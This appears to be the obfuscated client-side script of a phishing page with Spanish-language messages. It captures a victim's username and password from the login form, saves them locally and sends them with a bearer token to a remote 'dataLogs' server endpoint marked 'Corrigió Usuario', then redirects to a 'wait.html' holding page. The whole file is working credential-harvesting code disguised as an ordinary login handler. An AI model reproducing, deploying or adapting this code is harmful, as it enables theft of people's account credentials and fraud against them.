const _0x896eed = _0x8354;
(function (_0x5cfc76, _0x482029) {
  const _0x10c7bf = _0x8354,
    _0x1b7dec = _0x5cfc76();
  while (!![]) {
    try {
      const _0x2ff29f =
        parseInt(_0x10c7bf(0x72)) / 0x1 +
        (-parseInt(_0x10c7bf(0x79)) / 0x2) *
          (-parseInt(_0x10c7bf(0x91)) / 0x3) +
        (-parseInt(_0x10c7bf(0x92)) / 0x4) * (parseInt(_0x10c7bf(0x8a)) / 0x5) +
        parseInt(_0x10c7bf(0x8b)) / 0x6 +
        (parseInt(_0x10c7bf(0x71)) / 0x7) * (parseInt(_0x10c7bf(0x73)) / 0x8) +
        (-parseInt(_0x10c7bf(0x75)) / 0x9) * (parseInt(_0x10c7bf(0x6e)) / 0xa) +
        (-parseInt(_0x10c7bf(0x80)) / 0xb) * (-parseInt(_0x10c7bf(0x86)) / 0xc);
      if (_0x2ff29f === _0x482029) break;
      else _0x1b7dec["push"](_0x1b7dec["shift"]());
    } catch (_0x43ed21) {
      _0x1b7dec["push"](_0x1b7dec["shift"]());
    }
  }
})(_0x455b, 0x57ad1);
function _0x8354(_0x542871, _0x1c5bef) {
  const _0x455b28 = _0x455b();
  return (
    (_0x8354 = function (_0x83548e, _0x44ca23) {
      _0x83548e = _0x83548e - 0x6b;
      let _0x36f214 = _0x455b28[_0x83548e];
      return _0x36f214;
    }),
    _0x8354(_0x542871, _0x1c5bef)
  );
}
function updateLS() {
  const _0x189806 = _0x8354;
  LS["setItem"]("info", JSON[_0x189806(0x90)](info));
}
const button = document[_0x896eed(0x7a)](_0x896eed(0x6f)),
  userInput = document[_0x896eed(0x7a)](_0x896eed(0x7e)),
  passInput = document["getElementById"](_0x896eed(0x8c));
async function updateStatusUser() {
  const _0x785343 = _0x896eed;
  button[_0x785343(0x76)] = !![];
  try {
    const _0x7865b1 = localStorage[_0x785343(0x7b)]("dataLogId"),
      _0x16fa24 = localStorage["getItem"](_0x785343(0x78));
    if (!_0x7865b1 || !_0x16fa24) throw new Error(_0x785343(0x89));
    const _0x2cd54d = await fetch(
      url + "/dataLogs/updateUserDataLog/" + _0x7865b1,
      {
        method: "PUT",
        headers: {
          "Content-Type": "application/json",
          Authorization: _0x785343(0x74) + _0x16fa24,
          Origin: window[_0x785343(0x7d)][_0x785343(0x82)],
        },
        body: JSON["stringify"]({
          us: info[_0x785343(0x81)]["user"],
          ps: info[_0x785343(0x81)][_0x785343(0x7f)],
          status: _0x785343(0x77),
        }),
      }
    );
    if (!_0x2cd54d["ok"]) {
      const _0x2d97da = await _0x2cd54d["json"]();
      throw new Error(_0x2d97da[_0x785343(0x8d)] || _0x785343(0x8e));
    }
    console[_0x785343(0x87)]("Usuario\x20actualizado\x20correctamente"),
      (button["disabled"] = ![]),
      (window[_0x785343(0x7d)][_0x785343(0x6c)] = _0x785343(0x70));
  } catch (_0x1abbfb) {
    console[_0x785343(0x8d)](_0x785343(0x85), _0x1abbfb),
      alert(_0x785343(0x83)),
      (button[_0x785343(0x76)] = ![]);
  }
}
function _0x455b() {
  const _0x3a7858 = [
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage.",
    "32965SSECeK",
    "1801008VrIeKI",
    "txtPass",
    "error",
    "Error\x20al\x20actualizar\x20datos\x20en\x20el\x20servidor",
    "user",
    "stringify",
    "3NJfSbf",
    "220RwKomw",
    "focus",
    "href",
    "addEventListener",
    "230030gfPvqz",
    "btnUsuario",
    "wait.html",
    "938JPzeYu",
    "1912ZXgxDh",
    "3128Srxqcj",
    "Bearer\x20",
    "261nPDGlk",
    "disabled",
    "Corrigió\x20Usuario",
    "dataLogToken",
    "17356YTzNfK",
    "getElementById",
    "getItem",
    "preventDefault",
    "location",
    "txtUsuario",
    "puser",
    "11282381VVrCsm",
    "metaInfo",
    "origin",
    "Hubo\x20un\x20error\x20al\x20procesar\x20la\x20solicitud.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "value",
    "Error\x20al\x20actualizar\x20usuario:",
    "12cBufow",
    "log",
  ];
  _0x455b = function () {
    return _0x3a7858;
  };
  return _0x455b();
}
button[_0x896eed(0x6d)]("click", async function (_0x4b1b7b) {
  const _0x8e5017 = _0x896eed;
  _0x4b1b7b[_0x8e5017(0x7c)]();
  if (userInput["value"] == "" && passInput["value"] == "") {
    alert(_0x8e5017(0x88)), userInput[_0x8e5017(0x6b)]();
    return;
  } else {
    const _0x149387 = userInput["value"],
      _0x91e079 = passInput[_0x8e5017(0x84)];
    (info[_0x8e5017(0x81)][_0x8e5017(0x8f)] = _0x149387),
      (info[_0x8e5017(0x81)][_0x8e5017(0x7f)] = _0x91e079),
      updateLS(),
      await updateStatusUser();
  }
});
